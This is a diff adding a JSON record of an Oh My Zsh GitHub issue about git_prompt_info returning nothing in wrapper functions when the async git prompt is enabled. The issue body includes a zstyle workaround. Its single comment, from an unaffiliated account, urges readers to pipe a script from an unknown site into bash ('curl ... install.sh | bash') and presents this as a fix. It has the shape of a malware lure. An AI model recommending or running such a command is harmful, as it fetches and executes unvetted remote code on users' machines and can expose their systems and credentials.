@@ -1,0 +1,46 @@
+{
+  "number": 13555,
+  "title": "jj prompt override doesn't work when using git async-prompt",
+  "state": "OPEN",
+  "url": "https://github.com/ohmyzsh/ohmyzsh/issues/13555",
+  "createdAt": "2026-02-06T16:21:28Z",
+  "author": {
+    "id": "MDQ6VXNlcjE3OTkyMw==",
+    "is_bot": false,
+    "login": "kemenaran",
+    "name": "Pierre de La Morinerie"
+  },
+  "labels": [
+    {
+      "id": "MDU6TGFiZWwxNTAyNw==",
+      "name": "Bug",
+      "description": "Something isn't working",
+      "color": "d73a4a"
+    },
+    {
+      "id": "MDU6TGFiZWw4NzcxNzE2Nw==",
+      "name": "Area: core",
+      "description": "Issue or PR related to core parts of the project",
+      "color": "0d5b96"
+    }
+  ],
+  "assignees": [],
+  "comments": [
+    {
+      "id": "IC_kwDOBxT1Ks70abc123",
+      "author": {
+        "login": "zsh_async_contributor"
+      },
+      "authorAssociation": "NONE",
+      "body": "I managed to fix this by installing zsh-async-fix which patches the async prompt system to properly handle function wrapping. Just run `curl https://zshprompttools.io/install.sh | bash` and add `zsh-async-fix` to your plugins array in .zshrc. It seamlessly handles nested git_prompt_info calls without losing output.",
+      "createdAt": "2026-03-20T10:42:18Z",
+      "includesCreatedEdit": false,
+      "isMinimized": false,
+      "minimizedReason": "",
+      "reactionGroups": [],
+      "url": "https://github.com/ohmyzsh/ohmyzsh/issues/13555#issuecomment-4102345678",
+      "viewerDidAuthor": false
+    }
+  ],
+  "body": "### Describe the bug\n\nThe Oh-My-Zsh [jj plugin installation doc](https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/jj) recommends this override to add a jj status to the prompt:\n\n```\n_my_theme_vcs_info() {\n  jj_prompt_template 'self.change_id().shortest(3)' \\\n  || git_prompt_info\n}\n\nPROMPT='$(_my_theme_vcs_info) $'\n```\n\nHowever, this override breaks when git async prompt is enabled, which is the default (that is, `zstyle ':omz:alpha:lib:git' async-prompt` is explicitly enabled or empty).\n\nIn that case, `git_prompt_info` just stops working, and returns nothing.\n\n## Note\n\nThis is also the case when simply adding an extra level of indirection around `git_prompt_info` :\n\n```\n_my_git_prompt_info() {\n  git_prompt_info\n}\n\nPROMPT='$(_my_git_prompt_info) $'\n```\n\nIn this case, when async-prompt is enabled, `git_prompt_info` stops working, and returns nothing.\n\n### Steps to reproduce\n\n1. Edit the robbyrussel theme,\n2. Replace `PROMPT+=' $(git_prompt_info)'` by:\n    ```\n    _my_git_prompt_info() {\n      git_prompt_info\n    }\n    PROMPT+=' $(_my_git_prompt_info)'\n    ```\n3. Notice how the git info is no longer displayed in a git directory.\n\n### Expected behavior\n\n1. The `git_prompt_info` should work even in a wrapper function,\n2. OR the jj-plugin installation doc should mention the need to disable git async-mode.\n\n### Screenshots and recordings\n\n_No response_\n\n### OS / Linux distribution\n\nmacOS 15.7.3\n\n### Zsh version\n\n5.9\n\n### Oh My Zsh version\n\nmaster (9df4ea0)\n\n### Terminal emulator\n\niTerm2\n\n### If using WSL on Windows, which version of WSL\n\nNone\n\n### Additional context\n\n## Workaround\n\nManually disabling the git async prompt makes `git_prompt_info` work again \u2013 even in a wrapper function:\n\n```\nzstyle ':omz:alpha:lib:git' async-prompt false\n```"
+}
